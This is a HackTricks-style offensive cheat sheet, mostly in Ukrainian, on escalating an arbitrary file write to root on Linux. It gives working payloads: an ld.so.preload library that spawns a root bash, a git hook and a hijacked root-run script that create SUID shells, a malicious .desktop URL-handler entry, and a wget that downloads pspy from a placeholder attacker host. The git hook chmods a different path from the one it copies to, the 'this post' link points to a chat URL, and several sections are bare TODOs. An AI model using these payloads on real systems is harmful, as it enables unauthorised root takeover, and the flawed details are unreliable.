# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Цей файл поводиться як змінна оточення **`LD_PRELOAD`**, але він також працює в **SUID binaries**.\
Якщо ви можете створити його або змінити, ви можете просто додати **шлях до бібліотеки, яка буде завантажена** при кожному виконанні бінарного файлу.

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **скрипти**, які **виконуються** при різних **подіях** у git-репозиторії, наприклад коли створюється commit або під час merge. Тож якщо **привілейований скрипт або користувач** часто виконує такі дії і є можливість **записати в папку `.git`**, це можна використати для **privesc**.

Наприклад, можна **згенерувати скрипт** у git-репозиторії в **`.git/hooks`**, щоб він завжди виконувався при створенні нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Файл, розташований у `/proc/sys/fs/binfmt_misc`, вказує, який бінарний файл має виконуватися для певного типу файлів. TODO: перевірити вимоги для зловживання цим, щоб виконати rev shell, коли відкрито файл загального типу.

### Overwrite schema handlers (like http: or https:)

Зловмисник з правами запису до директорій конфігурації жертви може легко замінити або створити файли, що змінюють поведінку системи, внаслідок чого відбувається небажане виконання коду. Змінивши файл `$HOME/.config/mimeapps.list`, щоб вказати обробники URL HTTP та HTTPS на шкідливий файл (наприклад, встановивши `x-scheme-handler/http=evil.desktop`), зловмисник забезпечує, що **клацання будь-якого посилання http або https запускає код, вказаний у цьому файлі `evil.desktop`**. Наприклад, після розміщення наступного шкідливого коду в `evil.desktop` у `$HOME/.local/share/applications`, будь-яке зовнішнє натискання URL виконує вбудовану команду:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Для додаткової інформації перегляньте [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) де це було використано для експлуатації реальної вразливості.

### Root, що виконує скрипти/бінарні файли, доступні для запису користувачем

Якщо привілейований робочий процес виконує щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл всередині директорії, що належить непривілейованому користувачу), ви можете його перехопити:

- **Detect the execution:** відстежуйте процеси за допомогою [pspy](https://github.com/DominicBreuker/pspy) щоб помітити, коли root викликає шляхи, контрольовані користувачем:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що і цільовий файл, і його каталог належать вам і доступні для запису.
- **Захопіть ціль:** зробіть резервну копію оригінального binary/script і помістіть payload, який створює SUID shell (or any other root action), після чого відновіть дозволи:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Спровокуйте привілейовану дію** (наприклад, натиснувши кнопку UI, яка запускає helper). Коли root повторно виконає перехоплений шлях, отримайте привілейований shell за допомогою `./rootshell -p`.

## Посилання

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
